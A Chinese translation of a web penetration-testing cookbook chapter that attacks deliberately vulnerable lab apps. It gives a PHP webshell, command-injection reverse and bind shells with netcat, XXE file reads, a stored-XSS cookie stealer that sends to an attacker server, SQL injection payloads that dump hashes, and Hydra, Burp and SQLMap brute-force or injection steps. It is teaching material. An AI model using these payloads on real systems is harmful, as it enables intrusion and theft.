# Kali Linux Web 渗透测试秘籍（二）

> 译者：[飞龙](https://github.com/wizardforcel)

# 第六章：利用 -- 低悬的果实

> 作者：Gilberto Najera-Gutierrez

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

## 简介

这章开始我们会开始涉及渗透测试的的利用层面。和漏洞评估的主要不同是，漏洞评估中测试者识别漏洞（多数时间使用自动化扫描器）和提出如何减轻它们的建议。而渗透测试中测试者作为恶意攻击者并尝试利用检测到的漏洞，并得到最后的结果：整个系统的沦陷，内部网络访问，敏感数据泄露，以及其它。同时，要当心不要影响系统的可用性或者为真正的攻击者留下后门。

之前的章节中，我们已经涉及了如何检测 Web 应用中的一些漏洞。这一章中我们打算了解如何利用这些漏洞并使用它们来提取信息和获得应用及系统受限部分的访问权。

## 6.1 恶意使用文件包含和上传

我们在第四章中看到，文件包含漏洞在开发者对生成文件路径的输入校验不当，并使用该路径来包含源代码文件时出现。服务端语言的现代版本，例如 PHP 自 5.2.0 起，将一些特性默认关闭，例如远程文件包含，所以 2011 年起就不大可能找到 RFI 了。

这个秘籍中，我们会上传一些恶意文件，其中之一是 Webshell（可用于在服务器中执行命令的页面），之后使用本地文件包含来执行它。

### 准备

这个秘籍中，我们会使用  vulnerable_vm  中的 DVWA ，并以中等安全级别配置，所以让我们将其配置起来。

1.  访问` http://192.168.56.102/dvwa`。

2.  登录。

3.  将安全级别设置为中。访问`DVWA Security`，在组合框中选择`medium`并点击`Submit`。

我们会上传一些文件给服务器，但是你需要记住它们储存在哪里，以便之后调用。所以，在 DVWA 中访问`Upload`并上传任何 JPG 图像。如果成功了，他会告诉你文件上传到了`../../hackable/uploads/`。现在我们知道了用于储存上传文件的相对路径。这对于秘籍就足够了。

我们也需要准备好我们的文件，所以让我们创建带有一下内容的文本文件：

```php
<? 
system($_GET['cmd']); 
echo '<form method="post" action="../../hackable/uploads/webshell. php"><input type="text" name="cmd"/></form>'; 
?>
```

将其保存为`webshell.php`。我们需要另一个文件，创建`rename.php`并输入下列代码：

```php
<? 
system('mv ../../hackable/uploads/webshell.jpg ../../hackable/uploads/ webshell.php'); 
?>
```

这个文件会接受特殊图像文件（`webshell.jpg`）并将其重命名为`webshell.php`。

### 操作步骤

1.  首先，让我们尝试上传我们的 webshell。在 DVWA 中访问`Upload`之后尝试上传`webshell.php`，像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-1-1.jpg)
    
    于是，这里对于我们能够上传的东西有个验证。这意味着我们需要上传图标文件，或更精确来说，带有`.jpg`，`.gif`或`.png`的图像文件。这就是为什么我们需要重命名脚本来还原原始文件的`.php`扩展，便于我们执行它。
    
2.  为了避免验证错误，我们需要将我们的 PHP 文件重命名为有效的扩展名。在终端中，我们需要访问 PHP 文件所在目录并创建它们的副本：

    ```
    cp rename.php rename.jpg 
    cp webshell.php webshell.jpg
    ```
    
3.  现在，让我们返回 DVWA 并尝试上传二者：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-1-2.jpg)

4.  一旦两个 JPG 文件都上传了，我们使用本地文件包含漏洞过来执行`rename.jpg`。访问文件包含部分并利用这个漏洞来包含`../../hackable/uploads/rename.jpg`：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-1-3.jpg)
    
    我们并没有得到这个文件执行的任何输出，我们需要假设`webshell.jpg `命名为`webshell.php`。
    
5.  如果它能工作，我们应该能够包含`../../hackable/uploads/ webshell.php`，让我们试试：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-1-4.jpg)
    
6.  在左上角的文本框中，输入`/sbin/ifconfig`并按下回车：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-1-5.jpg)
    
    并且它能够工作。就像图片中那样，服务器的 IP 是`192.168.56.102`。现在，我们可以在服务器中执行命令，通过将它们键入到文本框中，或者为`cmd`参数设置不同的值。
    
### 工作原理

在上传有效 JPG 文件时，我们所做的第一个测试是为了发现上传文件保存的路径，便于我们可以在`rename.php`中，以及表单的`action`中使用这个路径。

使用重命名脚本有两个重要原因：首先，上传页面只允许 JPG 文件，所以我们的脚本需要这个扩展名，其次，我们需要带参数调用我们的 webshell（要执行的命令），而我们从 Web 服务器调用图片时不能带参数。

PHP 中的`system()`函数是攻击核心，它所做的是，执行系统命令并显示输出。这允许我们将 webshell 文件从`.jpg`重命名为`.php`文件并执行我们指定为 GET 参数的命令。

### 更多

一旦我们上传并执行了服务端代码，我们有很多选择来攻陷服务器，例如，下列代码可以在绑定的 shell 中调用：

```
nc -lp 12345 -e /bin/bash
```

它打开服务器的 TCP 12345 端口并监听连接。连接建立之后，它会将接收的信息作为输入来执行`/bin/bash`，并把输出通过网络发给被连接的主机（攻击者主机）。

也可以让服务器下载一些恶意程序，例如提权利用，执行它来获得更高权限。

## 6.2 利用 OS 命令注入

在上一个秘籍中，我们看到 PHP 的`system()`如何用于在服务器中执行 OS 命令。有时开发者会使用类似于它的指令，或者相同的功能来执行一些任务，有时候他们会使用无效的用户输入作为参数来执行命令。

这个秘籍中，我们会利用命令注入漏洞来提取服务器中的重要信息。

### 操作步骤

1.  登录 DVWA 访问`Command Execution`。

2.  我们会看到` Ping for FREE `表单，试试它吧。Ping `192.168.56.1 `（在主机网络中，我们的 Kali Linux 的 IP）。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-2-1.jpg)
    
    这个输出看起来像是直接的 ping 命令的输出。这表明服务器使用 OS 命令来执行 ping。所以它可能存在 OS 命令注入。
    
3.  让我们尝试注入一个非常简单的命令，提交下列代码：

    ```
    192.168.56.1;uname -a.
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-2-2.jpg)
    
    我们可以看到`uname`命令的输出就在 ping 的输出之后。这里存在命令注入漏洞。

4.  如果不带 IP 地址会怎么样呢：`;uname -a:`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-2-3.jpg)
    
5.  现在，我们打算获取服务端的反向 shell。首先我们必须确保服务器拥有所需的任何东西。提交下列代码：`;ls /bin/nc*`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-2-4.jpg)
    
    所以我们拥有多于一种版本的 Netcat，我们打算使用它来生成连接。`nc`的 OpenBSD 版本不支持执行连接命令，所以我们使用传统的版本。
    
6.  下一步是监听 Kali 主机的连接。打开终端并执行下列命令：

    ```
    nc -lp 1691 -v
    ```
    
7.  返回浏览器中，提交这个：`;nc.traditional -e /bin/bash 192.168.56.1 1691 &`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-2-5.jpg
    
    我们的终端会对连接做出反应。我们现在可以执行非交互式命令并检查它们的输出。
    
### 工作原理

就像 SQL 注入的例子那样，命令注入漏洞的来源于弱输入校验机制，以及使用用户提供的数据来拼接之后会用做 OS 命令的字符串。如果我们查看刚刚攻击的页面源代码（每个 DVWA 页面的右下角会有个按钮），会看到这些：

```php
<?php
if( isset( $_POST[ 'submit' ] ) ) {

    $target = $_REQUEST[ 'ip' ];
    
    // Determine OS and execute the ping command.    
    if (stristr(php_uname('s'), 'Windows NT')) {
        $cmd = shell_exec( 'ping  ' . $target );        
        echo '<pre>'.$cmd.'</pre>';            
        
    } else {             
        $cmd = shell_exec( 'ping  -c 3 ' . $target );        
        echo '<pre>'.$cmd.'</pre>';        
    }    
} 
?>
```

我们可以看到，它直接将用户的输入附加到 ping 命令后面。我们所做的仅仅是添加一个分号，系统的 shell 会将其解释为命令的分隔符，以及下一个我们打算执行的命令。

在成功执行命令之后，下一步就是验证服务器是否拥有 Netcat。它是一个能够建立网络连接的工具，在一些版本中还可以在新连接建立之后执行命令。我们看到了服务器的系统拥有两个不同版本的 Netcat，并执行了我们已知支持所需特性的版本。

之后我们配置攻击系统来监听 TCP 1691 端口连接（也可以是任何其它可用的 TCP 端口），然后我们让服务器连接到我们的机器，通过该端口并在连接建立时执行`/bin/bash`（系统 shell）。所以我们通过连接发送的任何东西都会被服务器接收作为 shell 的输入。

也可以让服务器下载一些恶意程序，例如提权利用，执行它来获得更高权限。

## 6.3 利用 XML 外部实体注入

XML 是主要用于描述文档或数据结构的格式，例如，HTML 是 XML 的实现，它定义了页面和它们的关系的结构和格式。

XML 实体类似于定义在 XML 结构中的数据结构，它们中的一些能够从文件系统中读取文件或者甚至是执行命令。

这个秘籍中，我们会利用 XML 外部实体注入漏洞来在服务器中执行代码。

### 准备

建议你开始之前遵循上一个秘籍中的步骤。

### 操作步骤

1.  浏览`http://192.168.56.102/mutillidae/index.php?page=xmlvalidator.php`。

2.  上面写着它是个 XML 校验器。让我们尝试提交测试示例来观察发生什么。在 XML 输入框中，输入` <somexml><message>Hello World</message></ somexml>`，并点击` Validate XML`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-3-1.jpg)
    
3.  现在让我们观察它是否正确处理了实体，提交系列代码：

    ```xml
    <!DOCTYPE person [  
        <!ELEMENT person ANY>  
        <!ENTITY person "Mr Bob"> 
    ]> 
    <somexml><message>Hello World &person;</message></somexml>
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-3-2.jpg)
    
    这里，我们仅仅定义了实体并将值`"Mr Bob" `赋给它。解析器在展示结果时解释了实体并替换了它的值。
    
4.  这就是内部实体的使用，让我们尝试外部实体：

    ```xml
    <!DOCTYPE fileEntity [  
        <!ELEMENT fileEntity ANY>  
        <!ENTITY fileEntity SYSTEM "file:///etc/passwd"> 
    ]> 
    <somexml><message>Hello World &fileEntity;</message></somexml>
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-3-3.jpg)
    
    使用这个技巧，我们就可以提取系统中的任何文件，只要它们可以在 Web 服务器的运行环境被用户读取。
    
    我们也可以使用 XEE 来加载页面。在上一个秘籍中，我们已经设法将 webshell 上传到服务器中，让我们试试吧。
    
    ```xml
    <!DOCTYPE fileEntity [ 
        <!ELEMENT fileEntity ANY> 
        <!ENTITY fileEntity SYSTEM "http://192.168.56.102/dvwa/hackable/uploads/ webshell.php?cmd=/sbin/ifconfig"> 
    ]> 
    <somexml><message>Hello World &fileEntity;</message></somexml>
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-3-4.jpg)
    
### 工作原理

XML 拥有叫做实体的特性。XML 实体是与值关联的名称，每次实体在文档中使用的时候，它都会在 XML 文件处理时替换为值。使用它以及不同的可用包装器（`file://`来加载系统文件，或者`http://`来加载 URL），我们就可以通过输入校验和 XML 解析器的配置，恶意使用没有合理安全措施的实现，并提取敏感数据或者甚至在服务器中执行系统命令。

这个秘籍中，我们使用`file://`包装器来使解析器加载服务器中的任意文件，之后，使用`http://`包装器，我们调用了网页，它碰巧是同一个服务器中的 webshell，并执行了一些命令。

### 更多

这个漏洞也可以用于发起 DoS 攻击，叫做“Billion laughs”，你可以在维基百科中阅读更多信息：` https://en.wikipedia.org/wiki/Billion_laughs `。

PHP 也支持不同的 XML 实体包装器（类似于`file://`和`http://`），如果它在服务器中被开启，也会在不需要上传文件的情况下允许命令执行，它就是`expect://`。你可以在这里找到更多它和其它包装器的信息：`http://www.php.net/manual/en/wrappers.php`。

### 另见

XXE 漏洞如何在世界上最流行的站点上发现的例子，可以在这里查看：`http://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution`。

## 6.4 使用 Hydra 爆破密码

Hydra 是网络登录破解器，也就是在线的破解器，这意味着它可以用于通过爆破网络服务来发现登录密码。爆破攻击尝试猜测正确的密码，通过尝试所有可能的字符组合。这种攻击一定能找到答案，但可能要花费数百万年的时间。

虽然对于渗透测试者来说，等待这么长时间不太可行，有时候在大量服务器中测试一小部分用户名/密码组合是非常有效率的。

这个秘籍中，我们会使用 Hydra 来爆破登录页面，在一些已知用户上执行爆破攻击。

### 准备

我们需要拥有用户名列表，在我们浏览 vulnerable_vm 的时候我们在许多应用中看到了有效用户的一些名称。让我们创建文本文件`users. txt`，内容如下：

```
admin 
test 
user 
user1 
john
```

### 操作步骤

1.  我们的第一步是分析登录请求如何发送，以及服务器如何响应。我们使用 Burp Suite 来捕获 DVWA 的登录请求：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-4-1.jpg)
    
    我们可以看到请求是`/dvwa/login.php`，它拥有三个参数：`username`、`password`和`login`。
    
2.  如果我们停止捕获请求，并检查浏览器中的结果，我们可以看到响应是登录页面的重定向。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-4-2.jpg)
    
    有效的用户名/密码组合不应该直接重定向到登录页面，而应该是其它页面，例如`index.php`。所以我们假设有效登录会重定向到其它页面，我们会接受`index.php`作为用于分辨是否成功的字符串。Hydra 使用这个字符串来判断是否某个用户名/密码被拒绝了。
    
3.  现在，我们准备好攻击了，在终端中输入下列命令：

    ```
    hydra 192.168.56.102 http-form-post "/dvwa/login.php:username=^USE R^&password=^PASS^&Login=Login:login.php" -L users.txt -e ns -u -t 2 -w 30 -o hydra-result.txt
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-4-3.jpg)
    
    我们使用这个命令只尝试了两个用户名组合：密码等于用户名和密码为空。我们从这个攻击之中得到了两个有效密码，Hydra 中标为绿色。
    
### 工作原理

这个秘籍的第一个部分是捕获和分析请求，用于了解请求如何工作。如果我们考虑登录页面的输出，我们会看到消息“登录失败”，并且可以使用这个消息作为 Hydra 的输入来充当失败的字符串。但是，通过检查代理的历史，我们可以看到它出现在重定向之后，Hydra 只读取第一个响应，所以它并不能用，这也是我们使用`login.php`作为失败字符串的原因。

我们使用了多个参数来调用 Hydra：

+   首先是服务器的 IP 地址。
+   `http-form-post`：这表明 Hydra 会对 HTTP 表单使用 POST 请求。接下来是由冒号分隔的，登录页面的 URL。请求参数和失败字符串由`&`分隔，`^USER^`和`^PASS^`用于表示用户名和密码应该在请求中被放置的位置。
+   `-L users.txt`：这告诉 Hydra 从`users.txt`文件接收用户名称。
+   `-e ns`：Hydra 会尝试空密码并将用户名作为密码。
+   `-u`：Hydra 会首先迭代用户名而不是密码。这意味着 Hydra 首先会对单一的密码尝试所有用户名，之后移动到下一个密码。这在防止账户锁定的时候很有用。
+   `-t 2`：我们不想让登录请求填满服务器，所以我们使用两个线程，这意味着每次两个请求。
+   `-w 30`：设置超时时间，或者等待服务器响应的时间。
+   `-o hydra-result.txt`：将输出保存到文本文件中。当我们拥有几百个可能有效的密码时这会很实用。

### 更多

要注意我们没有使用`-P`选项来使用密码列表，或者`-x`选项来自动生成密码。我们这样做是因为爆破 Web 表单产生很大的网络流量，如果服务器对它没有防护，会产生 DoS 的情况。

不推荐使用大量的密码在生产服务器上执行爆破或字典攻击，因为我们会使服务器崩溃，阻拦有效用户，或者被客户端的保护机制阻拦。

推荐渗透测试者在执行这种攻击时对每个用户尝试四次，来避免被阻拦。例如，我们可以尝试`-e ns`，就像这里做的这样，之后添加`-p 123456`来测试三种可能性，没有密码、密码和用户名一样以及密码为`123456`，这是世界上最常见的密码之一。

## 6.5 使用 Burp Suite 执行登录页面的字典爆破

Burp Suite 的 Intruder 能够对 HTTP 请求的许多部分执行模糊测试和爆破攻击。在执行登录页面上的字典攻击时非常实用。

这个秘籍中，我们会使用 Burp Suite 的 Intruder 和 第二章生成的字典来通过登录获得访问权。

### 准备

这个秘籍需要字典列表。它可以是来自目标语言的简单单词列表，常见密码的列表，或者我们在第二章“使用 John the Ripper 生成字典”中的列表。

### 操作步骤

1.  第一步是设置 Burp Suite 用作浏览器的代理。

2.  浏览` http://192.168.56.102/WackoPicko/admin/index.php`。

3.  我们会看到登录页面，让我们尝试和测试用户名和密码。

4.  现在访问大力的历史，并查看我们刚刚生成的登录的 POST 请求：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-5-1.jpg)
    
5.  右击它并从菜单中选择` Send to intruder`。

6.  intruder 标签页会高亮，让我们访问它之后访问`Positions `标签页。这里我们会定义请求的哪个部分要用于测试。

7.  点击`Clear §`来清除之前选项的区域。

8.  现在，我们已经选择了什么会用作测试输入。高亮用户名的值（`test`），并点击`Add §`。

9.  对密码值执行相同操作，并点击` Cluster bomb`作为攻击类型：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-5-2.jpg)
    
0.  下一步就是定义 Intruder 用于对我们所选择的输入测试的值。访问`Payloads `标签页。

1.  使用写着`Enter a new item `的文本框和` Add`按钮，使用下列东西来填充列表：

    ```
    user 
    john 
    admin 
    alice 
    bob 
    administrator 
    user
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-5-3.jpg)
    
2.  现在从`Payload Set `框中选择`list 2`。

3.  我们会使用字典来填充这个列表，点击`Load`并选择字典文件。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-5-4.jpg)

4.  我们现在拥有了两个载荷集合，并准备好攻击登录页面了。在顶部的菜单中，访问`Intruder | Start attack`。

5.  如果我们使用免费版，会出现一个提示框告诉我们一些功能是禁用的。这里，我们可以不使用这些功能，点击`OK`。

6.  新的窗口会弹出，并展示攻击进度。为了分辨成功的登录，我们需要检查响应长度。点击`Length`列来排列结果，通过不同长度来识别响应比较容易。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-5-5.jpg)

7.  如果我们检查不同长度的结果，我们可以看到他重定向到了管理主页，就像下面这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-5-6.jpg)
    
### 工作原理

Intruder 所做的是，修改请求的特定部分，并使用定义好的载荷替换这些部分的值。载荷可以是这些东西：

+   简单列表：来自文件，由剪贴板传递或者写在文本框中的列表。

+   运行时文件：Intruder 可以在运行时从文件中读取载荷，所以如果文件非常大，它不会完全加载进内存。

+   数字：生成一列顺序或随机的数字，以十进制或十六进制形式。

+   用户名生成器：接受邮件地址列表，从中提取可能的用户。

+   爆破器：接受字符集并使用它来生成指定长度的所有排列。

这些载荷由 Intruder 以不同形式发送，在`Positions`标签页中由攻击类型指定。攻击类型在载荷标记中的组合和排列方式上有所不同。

+   Sniper：对于载荷的单一集合，它将每个载荷值放在每个标记位置，一次一个。

+   Battering ram：类似 Sniper，它使用载荷的单一集合，不同点是它在每个请求中将所有位置设置为相同的值。

+   Pitchfork：使用多个载荷集合，并将每个集合中的一个项目放到每个标记位置中。当我们拥有不能混用的预定义数据时，这会非常有用，例如，测试已知的用户名和密码。

+   Cluster bomb：测试多个载荷，所以每个可能的排列都可以测试到。

对于结果，我们可以看到所有失败尝试都有相同的响应，这里是 811 字节。所以我们假设成功响应的长度应该不同（因为它会重定向到用户主页）。如果碰巧成功和失败请求长度相同，我们也可以检查状态码或者使用搜索框来寻找响应中的特定模式。

### 更多

Kali 包含了非常实用的密码字典和单词列表集合，位于` /usr/ share/wordlists`。一些文件可以在这里找到：

+   `rockyou.txt`：Rockyou.com 在 2010 年被攻破，泄露了多于 14 亿的密码，这个列表包含它们。

+   `dnsmap.txt`：包含常用的子域名称，例如内部网络、FTP 或者 WWW。在我们爆破 DNS 服务器时非常实用。

+   `./dirbuster/*`：`dirbuster `目录包含 Web 服务器中常见的文件名称，这些文件可以在使用`DirBuster `或 OWASP ZAP 强制浏览时使用。

+   `./wfuzz/*`：在这个目录中，我们可以找到用于 Web 攻击的模糊字符串的大量集合，以及爆破文件。

## 6.6 通过 XSS 获得会话 Cookie

我们已经谈论过了 XSS，它是现在最常见的 Web 攻击之一。XSS 可以用于欺骗用户，通过模仿登录页面来获得身份，或者通过执行客户端命令来收集信息，或者通过获得会话 cookie 以及冒充在攻击者的浏览器中的正常用户来劫持会话。

这个秘籍中，我们会利用持久性 XSS 来获得用户的会话 Cookie，之后使用这个 cookie 来通过移植到另一个浏览器来劫持会话，之后冒充用户来执行操作。

### 准备

对于这个秘籍，我们需要启动 Web 服务器作为我们的 cookie 收集器，所以在我们攻击之前，我们需要启动 Kali 中的 Apache，之后在 root 终端中执行下列命令：

```
service apache2 start
```

在这本书所使用的系统中，Apache 的文档根目录位于`/var/www/html`，创建叫做`savecookie.php`的文件并输入下列代码：

```php
<?php 
$fp = fopen('/tmp/cookie_data.txt', 'a'); 
fwrite($fp, $_GET["cookie"] . "\n"); 
fclose($fp); 
?>
```

这个 PHP 脚本会收集由 XSS 发送的所有 cookie。为了确保它能工作，访问` http://127.0.0.1/savecookie.php?cookie=test`，并且检查`/tmp/cookie_data.txt`的内容：

```
cat /tmp/cookie_data.txt 
```

如果它显式了`test`单词，就能生效。下一步就是了解 Kali 主机在 VirtualBox 主机网络中的地址，执行：

```
ifconfig
```

对于这本书，Kali 主机 的`vboxnet0`接口 IP 为 192.168.56.1 。

### 操作步骤

1.  我们在这个秘籍中会使用两个不同的浏览器。OWASP Mantra 是攻击者的浏览器，Iceweasel 是受害者的浏览器。在攻击者的浏览器中，访问`http://192.168.56.102/peruggia/`。

2.  让我们给页面的图片添加一条评论，点击`Comment on this picture`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-6-1.jpg)

3.  在文本框中输入下列代码：

    ```html
    <script> 
        var xmlHttp = new XMLHttpRequest(); 
        xmlHttp.open( "GET", "http://192.168.56.1/savecookie.php?cookie=" + document.cookie, true ); 
        xmlHttp.send( null ); 
    </script>
    ```
    
4.  点击`Post`。

5.  页面会执行我们的脚本，即使我们看不见任何改动。检查 Cookie 文件的内容来查看结果。在我们的 Kali 主机上，打开终端并执行：

    ```
    cat /tmp/cookie_data.txt 
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-6-2.jpg)
    
    文件中会出现新的条目。
    
6.  现在，在受害者浏览器中访问` http://192.168.56.102/peruggia/`。

7.  点击`Login`。

8.  输入`admin`作为用户名和密码，并点击`Login`。

9.  让我们再次检查 Cookie 文件的内容：

    ```
    cat /tmp/cookie_data.txt 
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-6-3.jpg)
    
    最后一个条目由受害者的浏览器中的用户生成。
    
0.  现在在攻击者的浏览器中，确保你没有登录，并打开 Cookies Manager+（在 Mantra 的菜单中，`Tools | Application Auditing | Cookies Manager+`）。

1.  选择 192.168.56.102（vulnerable_vm）的`PHPSESSID ` Cookie。并点击`Edit`。

2.  从` /tmp/cookie_data.txt`复制最后一个 Cookie。之后将其粘贴到`Content`字段中，像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-6-4.jpg)
    
3.  点击`Save`，之后点击`Close`并在攻击者的浏览器中重新加载页面。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-6-5.jpg)
    
    现在我们通过持久性 XSS 攻击劫持了管理员的会话。
    
### 工作原理

简单来说，我们使用应用中的 XSS 漏洞来将会话 Cookie 发送给远程服务器，通过 JavaScript HTTP 请求。这个服务器被配置用于储存会话 Cookie，之后，我们获得一个会话 ID，并把它移植到不同的浏览器中来劫持验证用户的会话。下面，我们来看看每一步如何工作。

我们编写的 PHP 文件用于在 XSS 攻击执行时保存收到的 COokie。

我们输入的评论是一个脚本，使用 JavaScript 的 XMLHttpRequest 对象来向我们的恶意服务器发送 HTTP 请求，这个请求由两步构建：

```js
xmlHttp.open( "GET", "http://192.168.56.1/savecookie.php?cookie=" + document.cookie, true );
```

我们使用 GET 方法打开请求，向`http://192.168.56.1/savecookie.php` URL 添加叫做`cookie`的参数，它的值储存在`document.cookie`中，它是 JavaScript 中储存 cookie 值的变量。最后的参数设置为`true`，告诉浏览器这是异步请求，这意味着它不需要等待响应。

```js
xmlHttp.send( null )
```

最后的指令将请求发送给服务器。

在管理员登录并查看包含我们所发送评论的页面之后，脚本会执行，并且管理员的会话 cookie 就储存在我们的服务器中了。

最后，一旦我们获得了有效用户的会话 cookie，我们可以在浏览器中替换我们自己的会话 cookie，之后重新加载页面来执行操作，就像我们是这个用户一样。

### 更多

不仅仅是保存会话 Cookie 到文件，恶意服务器也可以使用这些 cookie 来向应用发送请求来冒充正常用户，以便执行操作，例如添加或删除评论、上传图片或创建新用户，甚至是管理员。

## 6.7 逐步执行基本的 SQL 注入

我们在第四章了解了如何检测 SQL 注入。这个秘籍中，我们会利用这个注入，并提取数据库的信息。

### 操作步骤

1.  我们已经知道了 DVWA 存在 SQL 注入的漏洞。所以我们使用 OWASP Mantra 登录，之后访问` http://192.168.56.102/dvwa/vulnerabilities/ sqli/`。

2.  在检测 SQL 注入存在之后，下一步就是查询，准确来说就是结果有多少列。在 ID 框中输入任何数字之后点击`Submit`。

3.  现在，打开 HackBar（按下 F9）并点击`Load URL`。地址栏中的 URL 应该出现在 HackBar 内。

4.  在 HackBar 中，我们将`id`参数的值替换为` 1' order by 1 -- '`，并点击`Execute`。

5.  我们通过执行请求，持续增加`order`数字后面的值，直到发生错误。这里例子中，它在`3`的时候发生。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-7-1.jpg)
    
6.  现在，我们知道了请求由两列。让我们尝试是否能使用 UNION 语句来提取一些信息。现在将`id`的值设为`1' union select 1,2 -- '`并点击`Excecute`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-7-2.jpg)

7.  这意味着我们可以在 UNION 查询中请求两个值。那么试试 DBMS 的版本和数据库用户如何呢？将`id`设为`1' union select @@version,current_user() -- '`并点击`Execute`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-7-3.jpg)

8.  让我们查找一些有关的东西，例如应用的用户。首先，我们需要定位用户表，将`id`设置为`1' union select table_schema, table_name FROM information_schema.tables WHERE table_name LIKE '%user%' -- '`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-7-4.jpg)
    
9.  好的，我们知道了数据库（或 Schema）叫做`dvwa`，我们要查找的表叫做`users`。因为我们只有两个地方来设置值，我们需要知道的哪一列对我们有用。将`id`设置为`1' union select column_name, 1 FROM information_schema.tables WHERE table_name = 'users' -- '`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-7-5.jpg)
    
0.  最后，我们确切知道了要请求什么，将`id`设为` 1' union select user, password FROM dvwa.users  -- '`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-7-6.jpg)
    
    在`First name`字段中，我们得到了应用的用户名，在`Surname`字段汇总，我们得到了每个用户的密码哈希。我们可以将这些哈希复制到我呢本文呢减重，并且尝试使用 John the Ripper 或我们喜欢的密码破解器来破解。
    
### 工作原理

在我们的第一次注入，` 1' order by 1 -- ' `到`1' order by 3 -- ' `中，我们使用 SQL 语言的特性，它允许我们通过特定的字段或类，使用它的编号来排列结果。我们用它来产生错误，于是能够知道查询一共有多少列，便于我们将其用于创建 UNION 查询。

UNION 查询语句用于连接两个拥有相同列数量的查询，通过注入这些我们就可以查询数据库中几乎所有东西。这个秘籍中，我们首先检查了它是否像预期一样工作，之后我们将目标设置为`users`表，并设法获得它。

第一步是弄清数据库和表的名称，我们通过查询`information_schema`数据库来实现，它是 MySQL 中储存所有数据库、表和列信息的数据库。

一旦我们知道了数据库和表的名称，我们在这个表中查询所有列，来了解我们需要查找哪一列，它的结果是`user`和`password`。

最后，我们注入查询来请求`dvwa`数据库的`users`表中的所有用户名和密码。

## 6.8 使用 SQLMap 发现和利用 SQL 注入

我们已经在上一个秘籍中看到，利用 SQL 注入是个繁琐的步骤。SQLMap  是个命令行工具，包含在 Kali 中，可以帮我们自动化检测和利用 SQL 注入。它带有多种技巧，并支持多种数据库。

这个秘籍中，我们会使用 SQLMap 来检测和利用 SQL 注入漏洞，并用它获得应用的用户名和密码。

### 操作步骤

1.  访问` http://192.168.56.102/mutillidae`。

2.  在 Mutillidae 的菜单中，访问`OWASP Top 10 | A1 – SQL Injection | SQLi Extract Data | User Info`。

3.  尝试任何用户名和密码，例如`user`和`password`之后点击`View Account Details`。

4.  登录会失败，但是我们对 URL 更感兴趣。访问地址栏并将完整的 URL 复制到剪贴板。

5.  现在，打开终端窗口，输入下列命令：

    ```
    sqlmap -u "http://192.168.56.102/mutillidae/index.php?page=userinfo.php&username=user&password=password&user-info-php-submitbutton=View+Account+Details" -p username --current-user --currentdb
    ```
    
    你可以注意到，`-u`参数就是所复制的 URL 的值。`-p`告诉 SQLMap 我们打算在用户名参数中查找注入。一旦漏洞被利用，我们想让它获得当前数据库用户名和数据库的名称。我们只打算获得这两个值，因为我们只想判断这个 URL 的`username`参数是否存在 SQL 注入。
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-8-1.jpg)
    
